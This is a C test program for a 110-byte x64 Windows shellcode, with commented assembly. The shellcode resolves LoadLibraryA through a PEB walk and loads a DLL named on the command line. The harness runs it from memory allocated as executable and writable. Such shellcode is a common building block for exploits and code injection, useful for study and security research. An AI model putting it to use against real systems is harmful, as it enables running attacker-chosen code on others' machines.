
#include <windows.h>
#include <stdio.h>

/* Copyright (c) 2014 Kevin Devine */
/* Size = 110 bytes */

char load64[] = {
  /* 0000 */  "\x53\x56\x57\x55"
  /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
  /* 0008 */  "\xEB\x5F"                      /*  jmp 00000069h                      */
  /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
  /* 000C */  "\x59"                          /*  pop rcx                            */
  /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
  /* 0011 */  "\x48\x8B\x76\x18"              /*  mov rsi, qword ptr [rsi+18h]       */
  /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
  /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
  /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
  /* 001E */  "\x48\x8B\x7E\x30"              /*  mov rdi, qword ptr [rsi+30h]       */
  /* 0022 */  "\x03\x4F\x3C"                  /*  add ecx, dword ptr [rdi+3Ch]       */
  /* 0025 */  "\x8B\x5C\x39\x28"              /*  mov ebx, dword ptr [rcx+rdi+28h]   */
  /* 0029 */  "\x8B\x74\x3B\x20"              /*  mov esi, dword ptr [rbx+rdi+20h]   */
  /* 002D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0030 */  "\x8B\x4C\x3B\x24"              /*  mov ecx, dword ptr [rbx+rdi+24h]   */
  /* 0034 */  "\x48\x03\xCF"                  /*  add rcx, rdi                       */
  /* 0037 */  "\x33\xD2"                      /*  xor edx, edx                       */
  /* 0039 */  "\x0F\xB7\x2C\x51"              /*  movzx ebp, word ptr [rcx+rdx*2]    */
  /* 003D */  "\xFF\xC2"                      /*  inc edx                            */
  /* 003F */  "\xAD"                          /*  lodsd                              */
  /* 0040 */  "\x81\x3C\x38\x4C\x6F\x61\x64"  /*  cmp dword ptr [rax+rdi], 64616F4Ch */
  /* 0047 */  "\x75\xF0"                      /*  jne 00000039h                      */
  /* 0049 */  "\x80\x7C\x38\x0B\x41"          /*  cmp byte ptr [rax+rdi+0Bh], 41h    */
  /* 004E */  "\x75\xE9"                      /*  jne 00000039h                      */
  /* 0050 */  "\x8B\x74\x3B\x1C"              /*  mov esi, dword ptr [rbx+rdi+1Ch]   */
  /* 0054 */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0057 */  "\x8B\x04\xAE"                  /*  mov eax, dword ptr [rsi+rbp*4]     */
  /* 005A */  "\x48\x03\xC7"                  /*  add rax, rdi                       */
  /* 005D */  "\x59"                          /*  pop rcx                            */
  /* 005E */  "\xFF\xD0"                      /*  call rax                           */
  /* 0060 */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
  /* 0064 */  "\x5D"                          /*  pop rbp                            */
  /* 0065 */  "\x5F"                          /*  pop rdi                            */
  /* 0066 */  "\x5E"                          /*  pop rsi                            */
  /* 0067 */  "\x5B"                          /*  pop rbx                            */
  /* 0068 */  "\xC3"                          /*  ret                                */
  /* 0069 */  "\xE8\x9C\xFF\xFF\xFF"          /*  call 0000000Ah                     */
};

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
  
  if (argc != 2) {
    printf ("\nUsage: load64_test <DLL name/path>");
    printf ("\nExample: load64_test ws2_32\n");
    return 0;
  }
  
  char *path = argv[1];
  size_t path_len = strlen (path);
  
  if (path_len > MAX_PATH) {
    printf ("\nPath exceeds MAX_PATH limit of %i bytes", MAX_PATH);
    return 0;
  }
  
  void *exec = VirtualAlloc(0, strlen (load64) + MAX_PATH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, load64, strlen (load64));
  strcat ((char*)exec, path);
  printf ("\nAssembly : %i\nFinal Size : %i", 
    strlen (load64), 
    path_len + strlen (load64));
  //DebugBreak();
  printf ("\nBase Address returned : 0x%016llX\n", ((__int64(*)())exec)());
  
  VirtualFree (exec, 0, MEM_RELEASE);
  return 0;
}

